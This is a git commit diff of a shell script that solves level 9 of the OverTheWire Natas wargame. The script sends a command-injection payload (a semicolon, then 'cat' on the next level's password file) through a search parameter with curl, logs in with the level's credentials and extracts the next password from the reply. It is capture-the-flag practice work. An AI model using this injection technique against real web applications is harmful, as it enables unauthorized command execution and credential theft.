77b7617e871c8febd85efc3d1232be0b94882aba
Mahmoud Fathi <m.fathi1991@gmail.com>
2021-02-13 00:06:52 +0100

    Get the password by using cURL.

--- natas09.sh
+++ natas09.sh
@@ -1,4 +1,10 @@
 #! /bin/sh
 
-printf "Enter '; cat /etc/natas_webpass/natas10 #' in the box.\n"
-# The password for natas10 is nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+NEEDLE="; cat /etc/natas_webpass/natas10 #"
+RESPONSE=$(curl -G http://natas9.natas.labs.overthewire.org \
+                --silent \
+                --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl \
+                --data-urlencode "needle=${NEEDLE}" \
+                --data-urlencode "submit=Search")
+PASSWORD=$(echo ${RESPONSE} | grep -Eo "<pre>.*</pre>" | grep -Eo [A-Za-z0-9]{32})
+printf "The password for natas10 is: ${PASSWORD}\n"
